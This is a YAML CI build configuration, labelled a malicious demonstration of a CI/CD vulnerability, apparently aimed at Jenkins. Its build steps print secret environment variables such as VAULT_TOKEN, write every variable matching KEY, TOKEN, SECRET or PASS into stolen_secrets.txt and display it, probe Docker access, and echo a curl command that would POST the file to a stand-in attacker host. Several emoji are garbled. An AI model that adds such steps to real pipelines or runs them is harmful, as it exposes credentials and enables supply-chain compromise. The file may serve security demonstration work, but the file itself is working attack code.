# Malicious configuration for CI/CD attack demonstration
build_commands:
  - echo "ğŸŸ¢ Starting legitimate command execution..."
  - echo "âš ï¸  WARNING: CI/CD Vulnerability Demonstration"
  
  # Stealing Jenkins secrets
  - echo "ğŸ”“ STEALING JENKINS SECRETS:"
  - echo "VAULT_TOKEN: $VAULT_TOKEN"
  - echo "GIT_REPO: $GIT_REPO"
  - echo "REGISTRY_HOST: $REGISTRY_HOST"
  
  # Export environment variables
  - env | grep -E "(KEY|TOKEN|SECRET|PASS|VAULT|PROXY)" > stolen_secrets.txt
  
  # Additional environment information
  - echo "Jenkins URL: $JENKINS_URL" >> stolen_secrets.txt
  - echo "Build Number: $BUILD_NUMBER" >> stolen_secrets.txt
  - echo "Workspace: $WORKSPACE" >> stolen_secrets.txt
  
  # Display stolen data
  - echo "ğŸ“ Stolen secrets saved to file:"
  - cat stolen_secrets.txt
  
  # Attempt Docker socket access (additional escalation)
  - echo "ğŸ³ Attempting Docker access:"
  - docker ps 2>/dev/null || echo "Docker not accessible"
  
  # Simulated data exfiltration
  - echo "ğŸŒ Simulating data exfiltration..."
  - echo "curl -X POST https://malicious-server.local/exfil -d @stolen_secrets.txt"
  
  - echo "âœ… 'Legitimate' commands completed"